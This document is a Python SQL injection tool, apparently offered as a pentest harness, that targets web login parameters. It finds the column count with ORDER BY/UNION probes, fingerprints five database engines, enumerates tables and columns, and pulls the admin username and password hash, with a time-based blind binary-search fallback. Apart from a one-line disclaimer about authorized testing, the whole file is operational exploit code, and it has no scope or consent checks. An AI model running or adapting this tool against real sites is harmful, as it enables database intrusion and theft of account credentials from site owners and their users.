#!/usr/bin/env python3
"""
sqli_test.py - SQL injection test harness.

Strategy: ORDER BY / UNION column-count discovery -> DBMS fingerprint ->
UNION-based extraction of the admin username and password hash, with a
time-based blind binary-search fallback when the UNION channel is closed.

For authorized security testing against hosts you control or are contracted
to assess.

Usage:
  python sqli_test.py -u http://target.example.com/login
  python sqli_test.py -u http://target.example.com/login -p username
  python sqli_test.py -u http://target.example.com/login -d "user=a&pass=b" -p pass
  python sqli_test.py -u http://target.example.com/login -p username --delay 6
  python sqli_test.py -u http://target.example.com/login -p username --dbms mysql
"""

from __future__ import annotations

import argparse
import random
import re
import string
import sys
import time
import urllib.parse
from dataclasses import dataclass
from typing import Callable

try:
    import requests
except ImportError:
    sys.exit("[!] missing dependency: pip install requests")


# --------------------------------------------------------------------------
# DBMS dialects
# --------------------------------------------------------------------------

@dataclass
class Dialect:
    name: str
    terminator: str          # comment style to kill the rest of the original query
    from_clause: str        # Oracle needs FROM DUAL; everyone else uses ""
    sleep: Callable[[str], str]   # f(expr) -> "SLEEP(5)" style
    schema_query: str       # list tables in the default schema
    schema_db: str          # how schema_query is parameterised
    concat: str             # string concatenation operator


def _mysql_sleep(expr: str) -> str:
    return f"IF({expr},SLEEP(%d),0)"


def _pg_sleep(expr: str) -> str:
    return f"CASE WHEN {expr} THEN pg_sleep(%d) ELSE pg_sleep(0) END"


def _sqlite_sleep(expr: str) -> str:
    return f"CASE WHEN {expr} THEN randomblob(%d000000) ELSE 0 END"


def _mssql_sleep(expr: str) -> str:
    return f"CASE WHEN {expr} THEN WAITFOR DELAY '0:00:%d' ELSE 0 END"


DIALECTS: dict[str, Dialect] = {
    "mysql": Dialect(
        name="mysql", terminator="-- -", from_clause="",
        sleep=_mysql_sleep, schema_db="database()",
        schema_query="SELECT table_name FROM information_schema.tables "
                     "WHERE table_schema={db} AND table_type='BASE TABLE'",
        concat="CONCAT(%s)",
    ),
    "postgresql": Dialect(
        name="postgresql", terminator="-- -", from_clause="",
        sleep=_pg_sleep, schema_db="'public'",
        schema_query="SELECT table_name FROM information_schema.tables "
                     "WHERE table_schema={db} AND table_type='BASE TABLE'",
        concat="(%s)",
    ),
    "sqlite": Dialect(
        name="sqlite", terminator="-- -", from_clause="",
        sleep=_sqlite_sleep, schema_db="''",
        schema_query="SELECT name FROM sqlite_master WHERE type='table'",
        concat="(%s)",
    ),
    "mssql": Dialect(
        name="mssql", terminator="-- -", from_clause="",
        sleep=_mssql_sleep, schema_db="DB_NAME()",
        schema_query="SELECT table_name FROM information_schema.tables "
                     "WHERE table_type='BASE TABLE'",
        concat="(%s)",
    ),
    "oracle": Dialect(
        name="oracle", terminator="-- -", from_clause=" FROM DUAL",
        sleep=lambda e: f"BEGIN CASE WHEN {e} THEN DBMS_LOCK.SLEEP(5); END CASE; END;",
        schema_db="''",
        schema_query="SELECT table_name FROM user_tables",
        concat="(%s)",
    ),
}

# version probes tried in order; the one that does not error wins
FINGERPRINT_PROBES = [
    ("mysql", "version()"),
    ("postgresql", "version()"),
    ("mssql", "@@version"),
    ("sqlite", "sqlite_version()"),
    ("oracle", "banner FROM v$version WHERE rownum=1"),
]


# --------------------------------------------------------------------------
# HTTP layer
# --------------------------------------------------------------------------

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")


class Requester:
    """Sends requests with one parameter (or the whole body) carrying a payload."""

    def __init__(self, url: str, param: str | None, data: str | None,
                 method: str, headers: dict, timeout: float):
        self.url = url
        self.param = param
        self.method = method.upper()
        self.headers = headers
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": UA, **headers})

        parsed = urllib.parse.urlparse(url)
        self.query_params = dict(urllib.parse.parse_qsl(parsed.query))

        if data:
            self.body_params = dict(urllib.parse.parse_qsl(data, keep_blank_values=True))
        else:
            self.body_params = {}
            if self.param is None:
                # default to the classic login field set
                self.body_params = {"username": "test", "password": "test"}

        if self.param is None and not self.query_params:
            self.param = "username"

    def build(self, payload: str) -> tuple[dict, dict]:
        """Return (params, data) with the payload injected into the target param."""
        params = dict(self.query_params)
        data = dict(self.body_params)
        if self.param:
            # inject into whichever dict actually carries it
            if self.param in data or not params:
                data[self.param] = payload
            else:
                params[self.param] = payload
        else:
            # whole-body mode: substitute the first value with the payload
            for k in list(data):
                data[k] = payload
                break
        return params, data

    def send(self, payload: str) -> requests.Response:
        params, data = self.build(payload)
        if self.method == "GET":
            return self.session.get(self.url, params=params, timeout=self.timeout,
                                    allow_redirects=True)
        return self.session.post(self.url, data=data, timeout=self.timeout,
                                 allow_redirects=True)

    def send_raw(self, params: dict, data: dict) -> requests.Response:
        if self.method == "GET":
            return self.session.get(self.url, params=params, timeout=self.timeout,
                                    allow_redirects=True)
        return self.session.post(self.url, data=data, timeout=self.timeout,
                                 allow_redirects=True)

    def baseline(self) -> requests.Response:
        params, data = dict(self.query_params), dict(self.body_params)
        if self.param:
            placeholder = data.get(self.param, "test")
            data[self.param] = params.get(self.param, placeholder)
        return self.send_raw(params, data)


ERROR_SIGNS = re.compile(
    r"sql syntax|mysql_fetch|warning.*mysql|ORA-\d{5}|pg_query|"
    r"unclosed quotation|odbc.*driver|syntax error.*sqlite|"
    r"you have an error in your sql|supplied argument is not a valid",
    re.I,
)


def looks_like_error(r: requests.Response) -> bool:
    if r.status_code >= 500:
        return True
    return bool(ERROR_SIGNS.search(r.text))


def marker() -> str:
    return "0x4d7a" + "".join(random.choice("0123456789abcdef") for _ in range(8))


# --------------------------------------------------------------------------
# Stage 1 - column count
# --------------------------------------------------------------------------

def probe_column_count(req: Requester, mk: str, d: Dialect,
                        max_cols: int = 40) -> tuple[int | None, str]:
    """Try ORDER BY first (cheap, no row echo), then UNION as a fallback."""
    for n in range(1, max_cols + 1):
        p = f"{mk}' ORDER BY {n}{d.terminator}"
        r = req.send(p)
        if not looks_like_error(r):
            # confirm with a UNION at the same width
            for term in (d.terminator, ""):
                cols = ",".join(["NULL"] * n)
                p2 = f"{mk}' UNION ALL SELECT {cols}{d.from_clause}{term}"
                r2 = req.send(p2)
                if not looks_like_error(r2):
                    return n, f"UNION ALL (ORDER BY probe reached {n})"
            return n, f"ORDER BY {n} accepted, UNION confirmation inconclusive"
    return None, "no column count found"


# --------------------------------------------------------------------------
# Stage 2 - fingerprint
# --------------------------------------------------------------------------

def fingerprint(req: Requester, mk: str, ncols: int,
                d: Dialect) -> tuple[str, str | None]:
    """Return (dbms_name, version_string_or_None)."""
    for name, probe in FINGERPRINT_PROBES:
        if name != d.name:
            continue
        cols = ["NULL"] * ncols
        # marker first so we can anchor, version second
        cols[0] = f"'{mk}'"
        if ncols > 1:
            cols[1] = probe
        p = (f"{mk}' UNION ALL SELECT {','.join(cols)}"
             f"{d.from_clause}{d.terminator}")
        r = req.send(p)
        if not looks_like_error(r):
            i = r.text.find(mk)
            ver = r.text[i + len(mk):i + len(mk) + 80].strip() if i >= 0 else None
            return name, ver
    # probe every dialect regardless of the configured one
    for name, probe in FINGERPRINT_PROBES:
        cols = ["NULL"] * ncols
        cols[0] = f"'{mk}'"
        if ncols > 1:
            cols[1] = probe
        p = (f"{mk}' UNION ALL SELECT {','.join(cols)}"
             f"{d.from_clause}{d.terminator}")
        r = req.send(p)
        if not looks_like_error(r):
            i = r.text.find(mk)
            ver = r.text[i + len(mk):i + len(mk) + 80].strip() if i >= 0 else None
            return name, ver
    return d.name, None


# --------------------------------------------------------------------------
# Stage 3 - UNION extraction
# --------------------------------------------------------------------------

def union_select(req: Requester, mk_anchor: str, ncols: int, expr: str,
                 d: Dialect) -> str | None:
    """Run expr through a UNION and scrape the value following the anchor."""
    mk = marker()
    cols = ["NULL"] * ncols
    cols[0] = f"'{mk}'"
    if ncols > 1:
        cols[1] = expr
    p = (f"{mk_anchor}' UNION ALL SELECT {','.join(cols)}"
         f"{d.from_clause}{d.terminator}")
    r = req.send(p)
    if looks_like_error(r):
        return None
    i = r.text.find(mk)
    if i < 0:
        return None
    tail = r.text[i + len(mk):]
    # stop at the next tag or newline-ish boundary
    m = re.match(r"\s*([^<\n\r]{0,300})", tail)
    val = (m.group(1) if m else "").strip()
    # NULL comes back as an empty marker position followed by nothing useful
    return val or None


# --------------------------------------------------------------------------
# Stage 4 - schema discovery
# --------------------------------------------------------------------------

USER_TABLE_HINTS = ("user", "users", "member", "members", "account", "accounts",
                    "admin", "staff", "auth", "principal", "login")
USER_COL_HINTS = ("user", "username", "login", "email", "name", "account", "nick")
HASH_COL_HINTS = ("pass", "password", "passwd", "pwd", "hash", "digest",
                  "secret", "credential", "token")
ADMIN_HINTS = ("admin", "administrator", "is_admin", "role", "superuser", "root")


def list_tables(req: Requester, mk: str, ncols: int, d: Dialect) -> list[str]:
    q = d.schema_query.format(db=d.schema_db)
    raw = union_select(req, mk, ncols, f"GROUP_CONCAT({q})" if d.name == "mysql" else q, d)
    if not raw:
        # mysql only - fall back to pulling a single column at a time is not
        # viable; try the non-group variant which some backends accept
        raw = union_select(req, mk, ncols, q, d)
    if not raw:
        return []
    parts = re.split(r"[,\s]+", raw)
    return [p.strip(" `\"'") for p in parts if p.strip(" `\"'")]


def find_table(tables: list[str], hint: str) -> str | None:
    hint = hint.lower()
    for t in tables:
        if t.lower() == hint:
            return t
    for t in tables:
        if hint in t.lower():
            return t
    for t in tables:
        if any(h in t.lower() for h in USER_TABLE_HINTS):
            return t
    return None


def columns_of(req: Requester, mk: str, ncols: int, table: str,
                d: Dialect) -> list[str]:
    if d.name == "sqlite":
        q = f"SELECT sql FROM sqlite_master WHERE type='table' AND name='{table}'"
        raw = union_select(req, mk, ncols, q, d)
        if raw:
            inside = re.search(r"\(([^)]*)\)", raw)
            if inside:
                return [c.strip().split()[0].strip('"`')
                        for c in inside.group(1).split(",") if c.strip()]
        return []

    q = (f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns "
         f"WHERE table_name='{table}'" if d.name == "mysql" else
         f"SELECT string_agg(column_name, ',') FROM information_schema.columns "
         f"WHERE table_name='{table}'")
    raw = union_select(req, mk, ncols, q, d)
    if not raw:
        return []
    return [c.strip(" `\"'") for c in re.split(r"[,\s]+", raw) if c.strip(" `\"'")]


def pick(cols: list[str], hints: tuple[str, ...]) -> str | None:
    low = [(c, c.lower()) for c in cols]
    for h in hints:
        for c, l in low:
            if l == h:
                return c
    for h in hints:
        for c, l in low:
            if h in l:
                return c
    return None


# --------------------------------------------------------------------------
# Stage 5 - time-based blind fallback
# --------------------------------------------------------------------------

def calibrate_delay(req: Requester, mk: str, d: Dialect,
                    target: float) -> float:
    """Measure normal response latency so we can tell a real delay from jitter."""
    samples = []
    for _ in range(3):
        t0 = time.perf_counter()
        req.send(f"{mk}' AND 1=1{d.terminator}")
        samples.append(time.perf_counter() - t0)
    return min(samples)


def time_blind_extract(req: Requester, mk: str, d: Dialect, expr: str,
                       delay: float, baseline: float,
                       maxlen: int = 200) -> str | None:
    """
    Binary search per character using a conditional time delay.
    Requires a boolean context: <injection> AND (cond) AND 'a'='a
    """
    threshold = baseline + (delay * 0.75)
    out: list[str] = []
    for pos in range(1, maxlen + 1):
        lo, hi = 1, 127
        if not _one_char(req, mk, d, expr, pos, threshold, low=1, high=127):
            break
        while lo < hi:
            mid = (lo + hi) // 2
            if _one_char(req, mk, d, expr, pos, threshold, low=lo, high=mid):
                lo = mid + 1
            else:
                hi = mid
        if lo == 0:
            break
        out.append(chr(lo))
        sys.stdout.write("\r  [blind] " + "".join(out) + "   ")
        sys.stdout.flush()
    if out:
        print()
    return "".join(out) or None


def _one_char(req: Requester, mk: str, d: Dialect, expr: str, pos: int,
              threshold: float, low: int, high: int) -> bool:
    """True if the char at pos is in [low, high] (injection fires -> delay)."""
    cond = f"ASCII(SUBSTRING(({expr}),{pos},1)) BETWEEN {low} AND {high}"
    payload = d.sleep(cond) % delay if "%d" in d.sleep(cond) else d.sleep(cond)
    p = f"{mk}' AND {payload} AND 'x'='x"
    t0 = time.perf_counter()
    try:
        req.send(p)
    except requests.RequestException:
        return False
    return (time.perf_counter() - t0) >= threshold


# --------------------------------------------------------------------------
# Orchestration
# --------------------------------------------------------------------------

def discover_params(url: str) -> list[str]:
    """Best-effort scrape of input names from the login page."""
    try:
        r = requests.get(url, headers={"User-Agent": UA}, timeout=10)
    except requests.RequestException:
        return []
    names = re.findall(r"<input[^>]+name=[\"']([^\"']+)[\"']", r.text, re.I)
    seen, out = set(), []
    for n in names:
        if n.lower() not in seen:
            seen.add(n.lower())
            out.append(n)
    return out


def run(args: argparse.Namespace) -> int:
    url = args.url
    param = args.param

    if not param and args.data:
        param = list(dict(urllib.parse.parse_qsl(args.data)).keys())[0]
    if not param:
        found = discover_params(url)
        candidates = [p for p in found
                      if p.lower() in ("username", "user", "login", "email", "pass", "password")]
        param = candidates[0] if candidates else (found[0] if found else "username")
        print(f"[*] auto-selected parameter: {param}"
              + (f"  (page inputs: {', '.join(found)})" if found else "  (no inputs scraped)"))

    req = Requester(url, param, args.data, args.method, {}, args.req_timeout)
    d = DIALECTS[args.dbms]
    mk = marker()

    print(f"[*] target   {url}")
    print(f"[*] param    {param}   method {args.method}")
    print(f"[*] dialect  {d.name} (assumed)")

    base = req.baseline()
    print(f"[*] baseline HTTP {base.status_code}, {len(base.text)} bytes")
    if base.status_code >= 400:
        print("[!] baseline returned an error; injection may still be present "
              "but column discovery will be unreliable")

    ncols, note = probe_column_count(req, mk, d)
    print(f"[*] columns: {ncols}  ({note})")
    if not ncols:
        print("[!] no UNION column count - falling back to time-based blind")
        return blind_only(req, mk, d, args)

    dbms, ver = fingerprint(req, mk, ncols, d)
    d = DIALECTS[dbms]
    print(f"[+] dbms: {dbms}   version: {ver or 'n/a'}")

    tables = list_tables(req, mk, ncols, d)
    if not tables:
        print("[!] could not enumerate tables via UNION - using time-based blind")
        return blind_only(req, mk, d, args)
    print(f"[+] tables ({len(tables)}): {', '.join(tables[:25])}"
          + (" ..." if len(tables) > 25 else ""))

    table = find_table(tables, args.table) if args.table else find_table(tables, "users")
    if not table:
        print("[!] no plausible user table found")
        return 1
    print(f"[+] user table: {table}")

    cols = columns_of(req, mk, ncols, table, d)
    if not cols:
        print("[!] could not read column metadata for the user table")
        return 1
    print(f"[+] columns: {', '.join(cols)}")

    # explicit overrides win over heuristic column detection
    ucol = args.user_col or pick(cols, USER_COL_HINTS)
    pcol = args.pass_col or pick(cols, HASH_COL_HINTS)
    acol = pick(cols, ADMIN_HINTS)
    if args.user_col and args.user_col not in cols:
        print(f"[!] --user-col {args.user_col!r} is not among the real columns "
              f"({', '.join(cols)}); query will likely fail")
    if args.pass_col and args.pass_col not in cols:
        print(f"[!] --pass-col {args.pass_col!r} is not among the real columns "
              f"({', '.join(cols)}); query will likely fail")
    if not ucol or not pcol:
        print("[!] could not identify username/password columns; "
              f"pass --user-col / --pass-col")
        return 1

    where = ""
    if acol and acol not in ("role",) and args.admin_filter:
        where = f" AND ({acol}='{args.admin_filter}' OR {acol}='1' OR {acol} IS NOT NULL)"

    expr = f"{ucol},{pcol} FROM {table} WHERE 1=1{where} LIMIT 1"
    raw = union_select(req, mk, ncols, expr, d)
    if raw and "," in raw:
        user, pw = raw.split(",", 1)
        print(f"\n[+] admin username: {user.strip()}")
        print(f"[+] password hash : {pw.strip()}")
        return 0

    print("[!] UNION extraction returned nothing usable - time-based blind fallback")
    return blind_only(req, mk, d, args, expr_hint=(ucol, pcol, table, where))


def blind_only(req: Requester, mk: str, d: Dialect, args: argparse.Namespace,
               expr_hint: tuple | None = None) -> int:
    """
    Time-based blind path. With expr_hint we know the shape of the query and
    can go straight at username and hash; otherwise we probe a generic
    concatenation and report whatever comes back.
    """
    delay = args.delay
    baseline = calibrate_delay(req, mk, d, delay)
    print(f"[*] baseline latency {baseline:.2f}s, delay probe {delay}s")

    if expr_hint is None:
        # no metadata: try the conventional names blind
        candidates = [f"(SELECT group_concat(username) FROM users)" if d.name == "mysql"
                      else f"(SELECT string_agg(username,',') FROM users)"]
        expr = candidates[0]
    else:
        ucol, pcol, table, where = expr_hint
        expr = f"{ucol} FROM {table} WHERE 1=1{where} LIMIT 1"

    user = time_blind_extract(req, mk, d, expr, delay, baseline)
    if not user:
        print("[!] blind extraction produced nothing - the time channel may be "
              "filtered by a WAF or the injection point may not be injectable")
        return 1
    print(f"[+] admin username (blind): {user}")

    if expr_hint:
        ucol, pcol, table, where = expr_hint
        pexpr = f"{pcol} FROM {table} WHERE {ucol}='{user}'{where} LIMIT 1"
        pw = time_blind_extract(req, mk, d, pexpr, delay, baseline)
        if pw:
            print(f"[+] password hash (blind): {pw}")
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(description="UNION + time-blind SQLi test harness")
    ap.add_argument("-u", "--url", required=True, help="target URL")
    ap.add_argument("-p", "--param", help="injectable parameter name")
    ap.add_argument("-d", "--data", help="POST body, e.g. 'username=a&password=b'")
    ap.add_argument("-X", "--method", default="POST", choices=["GET", "POST"])
    ap.add_argument("--dbms", default="mysql", choices=list(DIALECTS),
                    help="assumed dialect (default: mysql)")
    ap.add_argument("--table", help="user table name (default: autodetect)")
    ap.add_argument("--user-col", help="override username column")
    ap.add_argument("--pass-col", help="override password hash column")
    ap.add_argument("--admin-filter", default="admin",
                    help="value for the admin discriminator column")
    ap.add_argument("--delay", type=float, default=5.0,
                    help="blind time-delay in seconds (default: 5)")
    ap.add_argument("--req-timeout", type=float, default=15.0)
    ap.add_argument("--max-cols", type=int, default=40)
    args = ap.parse_args()

    try:
        return run(args)
    except requests.RequestException as e:
        return print(f"[!] request error: {e}") or 1
    except KeyboardInterrupt:
        return 130


if __name__ == "__main__":
    sys.exit(main())
